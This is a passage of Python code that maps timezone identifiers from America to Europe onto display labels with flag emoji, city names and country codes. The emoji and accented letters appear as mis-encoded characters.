            timezone = timezone.replace('America/El_Salvador', 'ğŸ‡¸ğŸ‡»El Salvador[SV]')
            timezone = timezone.replace('America/Ensenada', 'ğŸ‡²ğŸ‡½Ensenada[MX]')
            timezone = timezone.replace('America/Fort_Nelson', 'ğŸ‡¨ğŸ‡¦Fort Nelson[CA]')
            timezone = timezone.replace('America/Fort_Wayne', 'ğŸ‡ºğŸ‡¸Fort Wayne[US]')
            timezone = timezone.replace('America/Fortaleza', 'ğŸ‡§ğŸ‡·Fortaleza[BR]')
            timezone = timezone.replace('America/Glace_Bay', 'ğŸ‡¨ğŸ‡¦Glace Bay[CA]')
            timezone = timezone.replace('America/Godthab', 'ğŸ‡¬ğŸ‡±GodthÃ¥b[GL]')
            timezone = timezone.replace('America/Goose_Bay', 'ğŸ‡¨ğŸ‡¦Goose Bay[CA]')
            timezone = timezone.replace('America/Grand_Turk', 'ğŸ‡¹ğŸ‡¨Grand Turk[TC]')
            timezone = timezone.replace('America/Grenada', 'ğŸ‡¬ğŸ‡©Grenada[GD]')
            timezone = timezone.replace('America/Guadeloupe', 'ğŸ‡¬ğŸ‡µGuadeloupe[GP]')
            timezone = timezone.replace('America/Guatemala', 'ğŸ‡¬ğŸ‡¹Guatemala[GT]')
            timezone = timezone.replace('America/Guayaquil', 'ğŸ‡ªğŸ‡¨Guayaquil[EC]')
            timezone = timezone.replace('America/Guyana', 'ğŸ‡¬ğŸ‡¾Guyana[GY]')
            timezone = timezone.replace('America/Halifax', 'ğŸ‡¨ğŸ‡¦Halifax[CA]')
            timezone = timezone.replace('America/Havana', 'ğŸ‡¨ğŸ‡ºHavana[CU]')
            timezone = timezone.replace('America/Hermosillo', 'ğŸ‡²ğŸ‡½Hermosillo[MX]')
            timezone = timezone.replace('America/Indiana/Indianapolis', 'ğŸ‡ºğŸ‡¸Indianapolis[US]')
            timezone = timezone.replace('America/Indiana/Knox', 'ğŸ‡ºğŸ‡¸Knox[US]')
            timezone = timezone.replace('America/Indiana/Marengo', 'ğŸ‡ºğŸ‡¸Marengo[US]')
            timezone = timezone.replace('America/Indiana/Petersburg', 'ğŸ‡ºğŸ‡¸Petersburg[US]')
            timezone = timezone.replace('America/Indiana/Tell_City', 'ğŸ‡ºğŸ‡¸Tell City[US]')
            timezone = timezone.replace('America/Indiana/Vevay', 'ğŸ‡ºğŸ‡¸Vevay[US]')
            timezone = timezone.replace('America/Indiana/Vincennes', 'ğŸ‡ºğŸ‡¸Vincennes[US]')
            timezone = timezone.replace('America/Indiana/Winamac', 'ğŸ‡ºğŸ‡¸Winamac[US]')
            timezone = timezone.replace('America/Indianapolis', 'ğŸ‡ºğŸ‡¸Indianapolis[US]')
            timezone = timezone.replace('America/Inuvik', 'ğŸ‡¨ğŸ‡¦Inuvik[CA]')
            timezone = timezone.replace('America/Iqaluit', 'ğŸ‡¨ğŸ‡¦Iqaluit[CA]')
            timezone = timezone.replace('America/Jamaica', 'ğŸ‡¯ğŸ‡²Jamaica[JM]')
            timezone = timezone.replace('America/Jujuy', 'ğŸ‡¦ğŸ‡·Jujuy[AR]')
            timezone = timezone.replace('America/Juneau', 'ğŸ‡ºğŸ‡¸Juneau[US]')
            timezone = timezone.replace('America/Kentucky/Louisville', 'ğŸ‡ºğŸ‡¸Louisville[US]')
            timezone = timezone.replace('America/Kentucky/Monticello', 'ğŸ‡ºğŸ‡¸Monticello[US]')
            timezone = timezone.replace('America/Knox_IN', 'ğŸ‡ºğŸ‡¸Knox[US]')
            timezone = timezone.replace('America/Kralendijk', 'ğŸ‡§ğŸ‡¶Kralendijk[BQ]')
            timezone = timezone.replace('America/La_Paz', 'ğŸ‡§ğŸ‡´La Paz[BO]')
            timezone = timezone.replace('America/Lima', 'ğŸ‡µğŸ‡ªLima[PE]')
            timezone = timezone.replace('America/Los_Angeles', 'ğŸ‡ºğŸ‡¸Los Angeles[US]')
            timezone = timezone.replace('America/Louisville', 'ğŸ‡ºğŸ‡¸Louisville[US]')
            timezone = timezone.replace('America/Lower_Princes', 'ğŸ‡¸ğŸ‡½Lower Princes[SX]')
            timezone = timezone.replace('America/Maceio', 'ğŸ‡§ğŸ‡·MaceiÃ³[BR]')
            timezone = timezone.replace('America/Managua', 'ğŸ‡³ğŸ‡®Managua[NI]')
            timezone = timezone.replace('America/Manaus', 'ğŸ‡§ğŸ‡·Manaus[BR]')
            timezone = timezone.replace('America/Marigot', 'ğŸ‡²ğŸ‡«Marigot[MF]')
            timezone = timezone.replace('America/Martinique', 'ğŸ‡²ğŸ‡¶Martinique[MQ]')
            timezone = timezone.replace('America/Matamoros', 'ğŸ‡²ğŸ‡½Matamoros[MX]')
            timezone = timezone.replace('America/Mazatlan', 'ğŸ‡²ğŸ‡½MazatlÃ¡n[MX]')
            timezone = timezone.replace('America/Mendoza', 'ğŸ‡¦ğŸ‡·Mendoza[AR]')
            timezone = timezone.replace('America/Menominee', 'ğŸ‡ºğŸ‡¸Menominee[US]')
            timezone = timezone.replace('America/Merida', 'ğŸ‡²ğŸ‡½MÃ©rida[MX]')
            timezone = timezone.replace('America/Metlakatla', 'ğŸ‡ºğŸ‡¸Metlakatla[US]')
            timezone = timezone.replace('America/Mexico_City', 'ğŸ‡²ğŸ‡½Mexico City[MX]')
            timezone = timezone.replace('America/Miquelon', 'ğŸ‡µğŸ‡²Miquelon[PM]')
            timezone = timezone.replace('America/Moncton', 'ğŸ‡¨ğŸ‡¦Moncton[CA]')
            timezone = timezone.replace('America/Monterrey', 'ğŸ‡²ğŸ‡½Monterrey[MX]')
            timezone = timezone.replace('America/Montevideo', 'ğŸ‡ºğŸ‡¾Montevideo[UY]')
            timezone = timezone.replace('America/Montreal', 'ğŸ‡¨ğŸ‡¦Montreal[CA]')
            timezone = timezone.replace('America/Montserrat', 'ğŸ‡²ğŸ‡¸Montserrat[MS]')
            timezone = timezone.replace('America/Nassau', 'ğŸ‡§ğŸ‡¸Nassau[BS]')
            timezone = timezone.replace('America/New_York', 'ğŸ‡ºğŸ‡¸New York[US]')
            timezone = timezone.replace('America/Nipigon', 'ğŸ‡¨ğŸ‡¦Nipigon[CA]')
            timezone = timezone.replace('America/Nome', 'ğŸ‡ºğŸ‡¸Nome[US]')
            timezone = timezone.replace('America/Noronha', 'ğŸ‡§ğŸ‡·Fernando de Noronha[BR]')
            timezone = timezone.replace('America/North_Dakota/Beulah', 'ğŸ‡ºğŸ‡¸North Dakota[US]')
            timezone = timezone.replace('America/North_Dakota/Center', 'ğŸ‡ºğŸ‡¸North Dakota[US]')
            timezone = timezone.replace('America/North_Dakota/New_Salem', 'ğŸ‡ºğŸ‡¸North Dakota[US]')
            timezone = timezone.replace('America/Nuuk', 'ğŸ‡¬ğŸ‡±Nuuk[GL]')
            timezone = timezone.replace('America/Ojinaga', 'ğŸ‡²ğŸ‡½Ojinaga[MX]')
            timezone = timezone.replace('America/Panama', 'ğŸ‡µğŸ‡¦Panama[PA]')
            timezone = timezone.replace('America/Pangnirtung', 'ğŸ‡¨ğŸ‡¦Pangnirtung[CA]')
            timezone = timezone.replace('America/Paramaribo', 'ğŸ‡¸ğŸ‡·Paramaribo[SR]')
            timezone = timezone.replace('America/Phoenix', 'ğŸ‡ºğŸ‡¸Phoenix[US]')
            timezone = timezone.replace('America/Port-au-Prince', 'ğŸ‡­ğŸ‡¹Port-au-Prince[HT]')
            timezone = timezone.replace('America/Port_of_Spain', 'ğŸ‡¹ğŸ‡¹Port of Spain[TT]')
            timezone = timezone.replace('America/Porto_Acre', 'ğŸ‡§ğŸ‡·Porto Acre[BR]')
            timezone = timezone.replace('America/Porto_Velho', 'ğŸ‡§ğŸ‡·Porto Velho[BR]')
            timezone = timezone.replace('America/Puerto_Rico', 'ğŸ‡µğŸ‡·San Juan[PR]')
            timezone = timezone.replace('America/Punta_Arenas', 'ğŸ‡¨ğŸ‡±Punta Arenas[CL]')
            timezone = timezone.replace('America/Rainy_River', 'ğŸ‡¨ğŸ‡¦Rainy River[CA]')
            timezone = timezone.replace('America/Rankin_Inlet', 'ğŸ‡¨ğŸ‡¦Rankin Inlet[CA]')
            timezone = timezone.replace('America/Recife', 'ğŸ‡§ğŸ‡·Recife[BR]')
            timezone = timezone.replace('America/Regina', 'ğŸ‡¨ğŸ‡¦Regina[CA]')
            timezone = timezone.replace('America/Resolute', 'ğŸ‡¨ğŸ‡¦Resolute[CA]')
            timezone = timezone.replace('America/Rio_Branco', 'ğŸ‡§ğŸ‡·Rio Branco[BR]')
            timezone = timezone.replace('America/Rosario', 'ğŸ‡¦ğŸ‡·Rosario[AR]')
            timezone = timezone.replace('America/Santa_Isabel', 'ğŸ‡²ğŸ‡½Santa Isabel[MX]')
            timezone = timezone.replace('America/Santarem', 'ğŸ‡§ğŸ‡·SantarÃ©m[BR]')
            timezone = timezone.replace('America/Santiago', 'ğŸ‡¨ğŸ‡±Santiago[CL]')
            timezone = timezone.replace('America/Santo_Domingo', 'ğŸ‡©ğŸ‡´Santo Domingo[DO]')
            timezone = timezone.replace('America/Sao_Paulo', 'ğŸ‡§ğŸ‡·SÃ£o Paulo[BR]')
            timezone = timezone.replace('America/Scoresbysund', 'ğŸ‡¬ğŸ‡±Scoresbysund[GL]')
            timezone = timezone.replace('America/Shiprock', 'ğŸ‡ºğŸ‡¸Shiprock[US]')
            timezone = timezone.replace('America/Sitka', 'ğŸ‡ºğŸ‡¸Sitka[US]')
            timezone = timezone.replace('America/St_Barthelemy', 'ğŸ‡§ğŸ‡±St. BarthÃ©lemy[BL]')
            timezone = timezone.replace('America/St_Johns', 'ğŸ‡¨ğŸ‡¦St. John\'s[CA]')
            timezone = timezone.replace('America/St_Kitts', 'ğŸ‡°ğŸ‡³St. Kitts[KN]')
            timezone = timezone.replace('America/St_Lucia', 'ğŸ‡±ğŸ‡¨St. Lucia[LC]')
            timezone = timezone.replace('America/St_Thomas', 'ğŸ‡»ğŸ‡®St. Thomas[VI]')
            timezone = timezone.replace('America/St_Vincent', 'ğŸ‡»ğŸ‡¨St. Vincent[VC]')
            timezone = timezone.replace('America/Swift_Current', 'ğŸ‡¨ğŸ‡¦Swift Current[CA]')
            timezone = timezone.replace('America/Tegucigalpa', 'ğŸ‡­ğŸ‡³Tegucigalpa[HN]')
            timezone = timezone.replace('America/Thule', 'ğŸ‡¬ğŸ‡±Thule[GL]')
            timezone = timezone.replace('America/Thunder_Bay', 'ğŸ‡¨ğŸ‡¦Thunder Bay[CA]')
            timezone = timezone.replace('America/Tijuana', 'ğŸ‡²ğŸ‡½Tijuana[MX]')
            timezone = timezone.replace('America/Toronto', 'ğŸ‡¨ğŸ‡¦Toronto[CA]')
            timezone = timezone.replace('America/Tortola', 'ğŸ‡»ğŸ‡¬Tortola[VG]')
            timezone = timezone.replace('America/Vancouver', 'ğŸ‡¨ğŸ‡¦Vancouver[CA]')
            timezone = timezone.replace('America/Virgin', 'ğŸ‡»ğŸ‡®Virgin Islands[VI]')
            timezone = timezone.replace('America/Whitehorse', 'ğŸ‡¨ğŸ‡¦Whitehorse[CA]')
            timezone = timezone.replace('America/Winnipeg', 'ğŸ‡¨ğŸ‡¦Winnipeg[CA]')
            timezone = timezone.replace('America/Yakutat', 'ğŸ‡ºğŸ‡¸Yakutat[US]')
            timezone = timezone.replace('America/Yellowknife', 'ğŸ‡¨ğŸ‡¦Yellowknife[CA]')
            timezone = timezone.replace('Antarctica/Casey', 'ğŸ‡¦ğŸ‡¶Casey[AQ]')
            timezone = timezone.replace('Antarctica/Davis', 'ğŸ‡¦ğŸ‡¶Davis[AQ]')
            timezone = timezone.replace('Antarctica/DumontDUrville', 'ğŸ‡¦ğŸ‡¶Dumont d\'Urville[AQ]')
            timezone = timezone.replace('Antarctica/Macquarie', 'ğŸ‡¦ğŸ‡¶Macquarie Island[AQ]')
            timezone = timezone.replace('Antarctica/Mawson', 'ğŸ‡¦ğŸ‡¶Mawson[AQ]')
            timezone = timezone.replace('Antarctica/McMurdo', 'ğŸ‡³ğŸ‡¿McMurdo[NZ]')
            timezone = timezone.replace('Antarctica/Palmer', 'ğŸ‡¦ğŸ‡¶Palmer[AQ]')
            timezone = timezone.replace('Antarctica/Rothera', 'ğŸ‡¦ğŸ‡¶Rothera[AQ]')
            timezone = timezone.replace('Antarctica/South_Pole', 'ğŸ‡¦ğŸ‡¶South Pole[AQ]')
            timezone = timezone.replace('Antarctica/Syowa', 'ğŸ‡¦ğŸ‡¶Syowa[AQ]')
            timezone = timezone.replace('Antarctica/Troll', 'ğŸ‡¦ğŸ‡¶Troll[AQ]')
            timezone = timezone.replace('Antarctica/Vostok', 'ğŸ‡¦ğŸ‡¶Vostok[AQ]')
            timezone = timezone.replace('Arctic/Longyearbyen', 'ğŸ‡¸ğŸ‡¯Longyearbyen[SJ]')
            timezone = timezone.replace('Asia/Aden', 'ğŸ‡¾ğŸ‡ªAden[YE]')
            timezone = timezone.replace('Asia/Almaty', 'ğŸ‡°ğŸ‡¿Almaty[KZ]')
            timezone = timezone.replace('Asia/Amman', 'ğŸ‡¯ğŸ‡´Amman[JO]')
            timezone = timezone.replace('Asia/Anadyr', 'ğŸ‡·ğŸ‡ºAnadyr[RU]')
            timezone = timezone.replace('Asia/Aqtau', 'ğŸ‡°ğŸ‡¿Aqtau[KZ]')
            timezone = timezone.replace('Asia/Aqtobe', 'ğŸ‡°ğŸ‡¿Aqtobe[KZ]')
            timezone = timezone.replace('Asia/Ashgabat', 'ğŸ‡¹ğŸ‡²Ashgabat[TM]')
            timezone = timezone.replace('Asia/Ashkhabad', 'ğŸ‡¹ğŸ‡²Ashkhabad[TM]')
            timezone = timezone.replace('Asia/Atyrau', 'ğŸ‡°ğŸ‡¿Atyrau[KZ]')
            timezone = timezone.replace('Asia/Baghdad', 'ğŸ‡®ğŸ‡¶Baghdad[IQ]')
            timezone = timezone.replace('Asia/Bahrain', 'ğŸ‡§ğŸ‡­Bahrain[BH]')
            timezone = timezone.replace('Asia/Baku', 'ğŸ‡¦ğŸ‡¿Baku[AZ]')
            timezone = timezone.replace('Asia/Bangkok', 'ğŸ‡¹ğŸ‡­Bangkok[TH]')
            timezone = timezone.replace('Asia/Barnaul', 'ğŸ‡·ğŸ‡ºBarnaul[RU]')
            timezone = timezone.replace('Asia/Beirut', 'ğŸ‡±ğŸ‡§Beirut[LB]')
            timezone = timezone.replace('Asia/Bishkek', 'ğŸ‡°ğŸ‡¬Bishkek[KG]')
            timezone = timezone.replace('Asia/Brunei', 'ğŸ‡§ğŸ‡³Brunei[BN]')
            timezone = timezone.replace('Asia/Calcutta', 'ğŸ‡®ğŸ‡³Calcutta[IN]')
            timezone = timezone.replace('Asia/Chita', 'ğŸ‡·ğŸ‡ºChita[RU]')
            timezone = timezone.replace('Asia/Choibalsan', 'ğŸ‡²ğŸ‡³Choibalsan[MN]')
            timezone = timezone.replace('Asia/Chongqing', 'ğŸ‡¨ğŸ‡³Chongqing[CN]')
            timezone = timezone.replace('Asia/Chungking', 'ğŸ‡¨ğŸ‡³Chungking[CN]')
            timezone = timezone.replace('Asia/Colombo', 'ğŸ‡±ğŸ‡°Colombo[LK]')
            timezone = timezone.replace('Asia/Dacca', 'ğŸ‡§ğŸ‡©Dacca[BD]')
            timezone = timezone.replace('Asia/Damascus', 'ğŸ‡¸ğŸ‡¾Damascus[SY]')
            timezone = timezone.replace('Asia/Dhaka', 'ğŸ‡§ğŸ‡©Dhaka[BD]')
            timezone = timezone.replace('Asia/Dili', 'ğŸ‡¹ğŸ‡±Dili[TL]')
            timezone = timezone.replace('Asia/Dubai', 'ğŸ‡¦ğŸ‡ªDubai[AE]')
            timezone = timezone.replace('Asia/Dushanbe', 'ğŸ‡¹ğŸ‡¯Dushanbe[TJ]')
            timezone = timezone.replace('Asia/Famagusta', 'ğŸ‡¨ğŸ‡¾Famagusta[CY]')
            timezone = timezone.replace('Asia/Gaza', 'ğŸ‡µğŸ‡¸Gaza[PS]')
            timezone = timezone.replace('Asia/Harbin', 'ğŸ‡¨ğŸ‡³Harbin[CN]')
            timezone = timezone.replace('Asia/Hebron', 'ğŸ‡µğŸ‡¸Hebron[PS]')
            timezone = timezone.replace('Asia/Ho_Chi_Minh', 'ğŸ‡»ğŸ‡³Ho Chi Minh[VN]')
            timezone = timezone.replace('Asia/Hong_Kong', 'ğŸ‡­ğŸ‡°Hong Kong[HK]')
            timezone = timezone.replace('Asia/Hovd', 'ğŸ‡²ğŸ‡³Hovd[MN]')
            timezone = timezone.replace('Asia/Irkutsk', 'ğŸ‡·ğŸ‡ºIrkutsk[RU]')
            timezone = timezone.replace('Asia/Jakarta', 'ğŸ‡®ğŸ‡©Jakarta[ID]')
            timezone = timezone.replace('Asia/Jayapura', 'ğŸ‡®ğŸ‡©Jayapura[ID]')
            timezone = timezone.replace('Asia/Jerusalem', 'ğŸ‡®ğŸ‡±Jerusalem[IL]')
            timezone = timezone.replace('Asia/Kabul', 'ğŸ‡¦ğŸ‡«Kabul[AF]')
            timezone = timezone.replace('Asia/Kamchatka', 'ğŸ‡·ğŸ‡ºKamchatka[RU]')
            timezone = timezone.replace('Asia/Karachi', 'ğŸ‡µğŸ‡°Karachi[PK]')
            timezone = timezone.replace('Asia/Kashgar', 'ğŸ‡¨ğŸ‡³Kashgar[CN]')
            timezone = timezone.replace('Asia/Kathmandu', 'ğŸ‡³ğŸ‡µKathmandu[NP]')
            timezone = timezone.replace('Asia/Katmandu', 'ğŸ‡³ğŸ‡µKatmandu[NP]')
            timezone = timezone.replace('Asia/Khandyga', 'ğŸ‡·ğŸ‡ºKhandyga[RU]')
            timezone = timezone.replace('Asia/Kolkata', 'ğŸ‡®ğŸ‡³Kolkata[IN]')
            timezone = timezone.replace('Asia/Krasnoyarsk', 'ğŸ‡·ğŸ‡ºKrasnoyarsk[RU]')
            timezone = timezone.replace('Asia/Kuala_Lumpur', 'ğŸ‡²ğŸ‡¾Kuala Lumpur[MY]')
            timezone = timezone.replace('Asia/Kuching', 'ğŸ‡²ğŸ‡¾Kuching[MY]')
            timezone = timezone.replace('Asia/Kuwait', 'ğŸ‡°ğŸ‡¼Kuwait[KW]')
            timezone = timezone.replace('Asia/Macao', 'ğŸ‡²ğŸ‡´Macao[MO]')
            timezone = timezone.replace('Asia/Macau', 'ğŸ‡²ğŸ‡´Macau[MO]')
            timezone = timezone.replace('Asia/Magadan', 'ğŸ‡·ğŸ‡ºMagadan[RU]')
            timezone = timezone.replace('Asia/Makassar', 'ğŸ‡®ğŸ‡©Makassar[ID]')
            timezone = timezone.replace('Asia/Manila', 'ğŸ‡µğŸ‡­Manila[PH]')
            timezone = timezone.replace('Asia/Muscat', 'ğŸ‡´ğŸ‡²Muscat[OM]')
            timezone = timezone.replace('Asia/Nicosia', 'ğŸ‡¨ğŸ‡¾Nicosia[CY]')
            timezone = timezone.replace('Asia/Novokuznetsk', 'ğŸ‡·ğŸ‡ºNovokuznetsk[RU]')
            timezone = timezone.replace('Asia/Novosibirsk', 'ğŸ‡·ğŸ‡ºNovosibirsk[RU]')
            timezone = timezone.replace('Asia/Omsk', 'ğŸ‡·ğŸ‡ºOmsk[RU]')
            timezone = timezone.replace('Asia/Oral', 'ğŸ‡°ğŸ‡¿Oral[KZ]')
            timezone = timezone.replace('Asia/Phnom_Penh', 'ğŸ‡°ğŸ‡­Phnom Penh[KH]')
            timezone = timezone.replace('Asia/Pontianak', 'ğŸ‡®ğŸ‡©Pontianak[ID]')
            timezone = timezone.replace('Asia/Pyongyang', 'ğŸ‡°ğŸ‡µPyongyang[KP]')
            timezone = timezone.replace('Asia/Qatar', 'ğŸ‡¶ğŸ‡¦Qatar[QA]')
            timezone = timezone.replace('Asia/Qostanay', 'ğŸ‡°ğŸ‡¿Qostanay[KZ]')
            timezone = timezone.replace('Asia/Qyzylorda', 'ğŸ‡°ğŸ‡¿Qyzylorda[KZ]')
            timezone = timezone.replace('Asia/Rangoon', 'ğŸ‡²ğŸ‡²Rangoon[MM]')
            timezone = timezone.replace('Asia/Riyadh', 'ğŸ‡¸ğŸ‡¦Riyadh[SA]')
            timezone = timezone.replace('Asia/Saigon', 'ğŸ‡»ğŸ‡³Saigon[VN]')
            timezone = timezone.replace('Asia/Sakhalin', 'ğŸ‡·ğŸ‡ºSakhalin[RU]')
            timezone = timezone.replace('Asia/Samarkand', 'ğŸ‡ºğŸ‡¿Samarkand[UZ]')
            timezone = timezone.replace('Asia/Seoul', 'ğŸ‡°ğŸ‡·Seoul[KR]')
            timezone = timezone.replace('Asia/Shanghai', 'ğŸ‡¨ğŸ‡³Shanghai[CN]')
            timezone = timezone.replace('Asia/Singapore', 'ğŸ‡¸ğŸ‡¬Singapore[SG]')
            timezone = timezone.replace('Asia/Srednekolymsk', 'ğŸ‡·ğŸ‡ºSrednekolymsk[RU]')
            timezone = timezone.replace('Asia/Taipei', 'ğŸ‡¹ğŸ‡¼Taipei[TW]')
            timezone = timezone.replace('Asia/Tashkent', 'ğŸ‡ºğŸ‡¿Tashkent[UZ]')
            timezone = timezone.replace('Asia/Tbilisi', 'ğŸ‡¬ğŸ‡ªTbilisi[GE]')
            timezone = timezone.replace('Asia/Tehran', 'ğŸ‡®ğŸ‡·Tehran[IR]')
            timezone = timezone.replace('Asia/Tel_Aviv', 'ğŸ‡®ğŸ‡±Tel Aviv[IL]')
            timezone = timezone.replace('Asia/Thimbu', 'ğŸ‡§ğŸ‡¹Thimbu[BT]')
            timezone = timezone.replace('Asia/Thimphu', 'ğŸ‡§ğŸ‡¹Thimphu[BT]')
            timezone = timezone.replace('Asia/Tokyo', 'ğŸ‡¯ğŸ‡µTokyo[JP]')
            timezone = timezone.replace('Asia/Tomsk', 'ğŸ‡·ğŸ‡ºTomsk[RU]')
            timezone = timezone.replace('Asia/Ujung_Pandang', 'ğŸ‡®ğŸ‡©Ujung Pandang[ID]')
            timezone = timezone.replace('Asia/Ulaanbaatar', 'ğŸ‡²ğŸ‡³Ulaanbaatar[MN]')
            timezone = timezone.replace('Asia/Ulan_Bator', 'ğŸ‡²ğŸ‡³Ulan Bator[MN]')
            timezone = timezone.replace('Asia/Urumqi', 'ğŸ‡¨ğŸ‡³Urumqi[CN]')
            timezone = timezone.replace('Asia/Ust-Nera', 'ğŸ‡·ğŸ‡ºUst-Nera[RU]')
            timezone = timezone.replace('Asia/Vientiane', 'ğŸ‡±ğŸ‡¦Vientiane[LA]')
            timezone = timezone.replace('Asia/Vladivostok', 'ğŸ‡·ğŸ‡ºVladivostok[RU]')
            timezone = timezone.replace('Asia/Yakutsk', 'ğŸ‡·ğŸ‡ºYakutsk[RU]')
            timezone = timezone.replace('Asia/Yangon', 'ğŸ‡²ğŸ‡²Yangon[MM]')
            timezone = timezone.replace('Asia/Yekaterinburg', 'ğŸ‡·ğŸ‡ºYekaterinburg[RU]')
            timezone = timezone.replace('Asia/Yerevan', 'ğŸ‡¦ğŸ‡²Yerevan[AM]')
            timezone = timezone.replace('Atlantic/Azores', 'ğŸ‡µğŸ‡¹Azores[PT]')
            timezone = timezone.replace('Atlantic/Bermuda', 'ğŸ‡§ğŸ‡²Bermuda[BM]')
            timezone = timezone.replace('Atlantic/Canary', 'ğŸ‡ªğŸ‡¸Canary[ES]')
            timezone = timezone.replace('Atlantic/Cape_Verde', 'ğŸ‡¨ğŸ‡»Cape Verde[CV]')
            timezone = timezone.replace('Atlantic/Faeroe', 'ğŸ‡«ğŸ‡´Faroe Islands[FO]')
            timezone = timezone.replace('Atlantic/Faroe', 'ğŸ‡«ğŸ‡´Faroe Islands[FO]')
            timezone = timezone.replace('Atlantic/Jan_Mayen', 'ğŸ‡³ğŸ‡´Jan Mayen[NO]')
            timezone = timezone.replace('Atlantic/Madeira', 'ğŸ‡µğŸ‡¹Madeira[PT]')
            timezone = timezone.replace('Atlantic/Reykjavik', 'ğŸ‡®ğŸ‡¸Reykjavik[IS]')
            timezone = timezone.replace('Atlantic/South_Georgia', 'ğŸ‡¬ğŸ‡¸South Georgia[GS]')
            timezone = timezone.replace('Atlantic/St_Helena', 'ğŸ‡¸ğŸ‡­St. Helena[SH]')
            timezone = timezone.replace('Atlantic/Stanley', 'ğŸ‡«ğŸ‡°Stanley[FK]')
            timezone = timezone.replace('Australia/ACT', 'ğŸ‡¦ğŸ‡ºAustralian Capital Territory[AU]')
            timezone = timezone.replace('Australia/Adelaide', 'ğŸ‡¦ğŸ‡ºAdelaide[AU]')
            timezone = timezone.replace('Australia/Brisbane', 'ğŸ‡¦ğŸ‡ºBrisbane[AU]')
            timezone = timezone.replace('Australia/Broken_Hill', 'ğŸ‡¦ğŸ‡ºBroken Hill[AU]')
            timezone = timezone.replace('Australia/Canberra', 'ğŸ‡¦ğŸ‡ºCanberra[AU]')
            timezone = timezone.replace('Australia/Currie', 'ğŸ‡¦ğŸ‡ºCurrie[AU]')
            timezone = timezone.replace('Australia/Darwin', 'ğŸ‡¦ğŸ‡ºDarwin[AU]')
            timezone = timezone.replace('Australia/Eucla', 'ğŸ‡¦ğŸ‡ºEucla[AU]')
            timezone = timezone.replace('Australia/Hobart', 'ğŸ‡¦ğŸ‡ºHobart[AU]')
            timezone = timezone.replace('Australia/LHI', 'ğŸ‡¦ğŸ‡ºLord Howe Island[AU]')
            timezone = timezone.replace('Australia/Lindeman', 'ğŸ‡¦ğŸ‡ºLindeman[AU]')
            timezone = timezone.replace('Australia/Lord_Howe', 'ğŸ‡¦ğŸ‡ºLord Howe Island[AU]')
            timezone = timezone.replace('Australia/Melbourne', 'ğŸ‡¦ğŸ‡ºMelbourne[AU]')
            timezone = timezone.replace('Australia/NSW', 'ğŸ‡¦ğŸ‡ºNew South Wales[AU]')
            timezone = timezone.replace('Australia/North', 'ğŸ‡¦ğŸ‡ºNorth[AU]')
            timezone = timezone.replace('Australia/Perth', 'ğŸ‡¦ğŸ‡ºPerth[AU]')
            timezone = timezone.replace('Australia/Queensland', 'ğŸ‡¦ğŸ‡ºQueensland[AU]')
            timezone = timezone.replace('Australia/South', 'ğŸ‡¦ğŸ‡ºSouth[AU]')
            timezone = timezone.replace('Australia/Sydney', 'ğŸ‡¦ğŸ‡ºSydney[AU]')
            timezone = timezone.replace('Australia/Tasmania', 'ğŸ‡¦ğŸ‡ºTasmania[AU]')
            timezone = timezone.replace('Australia/Victoria', 'ğŸ‡¦ğŸ‡ºVictoria[AU]')
            timezone = timezone.replace('Australia/West', 'ğŸ‡¦ğŸ‡ºWest[AU]')
            timezone = timezone.replace('Australia/Yancowinna', 'ğŸ‡¦ğŸ‡ºYancowinna[AU]')
            timezone = timezone.replace('Brazil/Acre', 'ğŸ‡§ğŸ‡·Acre[BR]')
            timezone = timezone.replace('Brazil/DeNoronha', 'ğŸ‡§ğŸ‡·Fernando de Noronha[BR]')
            timezone = timezone.replace('Brazil/East', 'ğŸ‡§ğŸ‡·BrasÃ­lia[BR]')
            timezone = timezone.replace('Brazil/West', 'ğŸ‡§ğŸ‡·Amazon[BR]')
            timezone = timezone.replace('Canada/Atlantic', 'ğŸ‡¨ğŸ‡¦Atlantic[CA]')
            timezone = timezone.replace('Canada/Central', 'ğŸ‡¨ğŸ‡¦Central[CA]')
            timezone = timezone.replace('Canada/Eastern', 'ğŸ‡¨ğŸ‡¦Eastern[CA]')
            timezone = timezone.replace('Canada/Mountain', 'ğŸ‡¨ğŸ‡¦Mountain[CA]')
            timezone = timezone.replace('Canada/Newfoundland', 'ğŸ‡¨ğŸ‡¦Newfoundland[CA]')
            timezone = timezone.replace('Canada/Pacific', 'ğŸ‡¨ğŸ‡¦Pacific[CA]')
            timezone = timezone.replace('Canada/Saskatchewan', 'ğŸ‡¨ğŸ‡¦Saskatchewan[CA]')
            timezone = timezone.replace('Canada/Yukon', 'ğŸ‡¨ğŸ‡¦Yukon[CA]')
            timezone = timezone.replace('Chile/Continental', 'ğŸ‡¨ğŸ‡±Continental Chile[CL]')
            timezone = timezone.replace('Chile/EasterIsland', 'ğŸ‡¨ğŸ‡±Easter Island[CL]')
            timezone = timezone.replace('Cuba', 'ğŸ‡¨ğŸ‡ºCuba[CU]')
            timezone = timezone.replace('Egypt', 'ğŸ‡ªğŸ‡¬Egypt[EG]')
            timezone = timezone.replace('Eire', 'ğŸ‡®ğŸ‡ªIreland[IE]')
            timezone = timezone.replace('Etc/Greenwich', 'ğŸŒGreenwich')
            timezone = timezone.replace('Etc/UCT', 'ğŸŒUCT')
            timezone = timezone.replace('Etc/UTC', 'ğŸŒUTC')
            timezone = timezone.replace('Etc/Universal', 'ğŸŒUniversal')
            timezone = timezone.replace('Europe/Amsterdam', 'ğŸ‡³ğŸ‡±Amsterdam[NL]')
            timezone = timezone.replace('Europe/Andorra', 'ğŸ‡¦ğŸ‡©Andorra[AD]')
            timezone = timezone.replace('Europe/Astrakhan', 'ğŸ‡·ğŸ‡ºAstrakhan[RU]')
            timezone = timezone.replace('Europe/Athens', 'ğŸ‡¬ğŸ‡·Athens[GR]')
            timezone = timezone.replace('Europe/Belfast', 'ğŸ‡¬ğŸ‡§Belfast[GB]')
            timezone = timezone.replace('Europe/Belgrade', 'ğŸ‡·ğŸ‡¸Belgrade[RS]')
            timezone = timezone.replace('Europe/Berlin', 'ğŸ‡©ğŸ‡ªBerlin[DE]')
            timezone = timezone.replace('Europe/Bratislava', 'ğŸ‡¸ğŸ‡°Bratislava[SK]')
            timezone = timezone.replace('Europe/Brussels', 'ğŸ‡§ğŸ‡ªBrussels[BE]')
            timezone = timezone.replace('Europe/Bucharest', 'ğŸ‡·ğŸ‡´Bucharest[RO]')
            timezone = timezone.replace('Europe/Budapest', 'ğŸ‡­ğŸ‡ºBudapest[HU]')
            timezone = timezone.replace('Europe/Busingen', 'ğŸ‡©ğŸ‡ªBusingen[DE]')
